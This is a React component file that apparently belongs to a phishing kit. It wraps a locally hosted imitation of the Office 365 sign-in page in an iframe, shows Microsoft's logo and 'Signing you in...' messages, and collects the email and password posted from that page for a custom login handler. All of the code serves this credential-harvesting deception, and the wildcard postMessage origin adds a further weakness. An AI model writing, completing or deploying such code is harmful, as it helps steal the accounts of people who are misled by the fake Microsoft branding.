import React, { useState, useEffect, useRef } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface Office365WrapperProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

// A new loader component to show while the iframe is loading
const IframeLoader: React.FC = () => (
  <div className="w-full h-screen flex flex-col items-center justify-center bg-white">
    <div className="text-center">
      {/* This can be replaced with the SVG logo if preferred */}
      <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft logo" style={{ height: '23px', margin: '0 auto 24px' }} />
      <h1 style={{ fontSize: '24px', fontWeight: 600, color: '#1b1b1b' }}>Signing you in...</h1>
      <div style={{ marginTop: '2rem' }}>
        <Spinner size="lg" />
        <p style={{ marginTop: '20px', color: '#666' }}>
          Preparing secure sign-in...
        </p>
      </div>
    </div>
  </div>
);

const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onLoginError }) => {
  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [isIframeLoading, setIsIframeLoading] = useState(true); // State to manage iframe load

  // This logic for handling form submission from the iframe remains untouched
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data.type === 'OFFICE_365_SUBMIT') {
        const { email, password } = event.data.payload;
        handleFormSubmit(new Event('submit'), { email, password, provider: 'Office365' });
      }
    };
    window.addEventListener('message', handleMessage);
    return () => {
      window.removeEventListener('message', handleMessage);
    };
  }, [handleFormSubmit]);

  // This logic for sending errors down to the iframe remains untouched
  useEffect(() => {
    if (errorMessage && iframeRef.current?.contentWindow) {
      iframeRef.current.contentWindow.postMessage({
        type: 'LOGIN_ERROR',
        payload: { message: errorMessage }
      }, '*');
    }
  }, [errorMessage]);

  return (
    <>
      {/* The existing spinner for when login credentials are being verified */}
      {isLoading && (
        <div className="absolute inset-0 bg-white/80 flex flex-col items-center justify-center z-50">
          <Spinner size="lg" />
          <p className="mt-4 text-lg font-semibold text-gray-700">Signing in securely...</p>
        </div>
      )}

      {/* NEW: The instant loader that shows while the iframe itself is loading */}
      {isIframeLoading && <IframeLoader />}

      <iframe
        ref={iframeRef}
        src="/office.365.html"
        title="Office 365 Sign in"
        // The iframe is hidden until it's fully loaded
        style={{ display: isIframeLoading ? 'none' : 'block' }}
        className="w-full h-screen border-0"
        // When the iframe content is ready, hide the loader and show the iframe
        onLoad={() => setIsIframeLoading(false)}
      />
    </>
  );
};

export default Office365Wrapper;
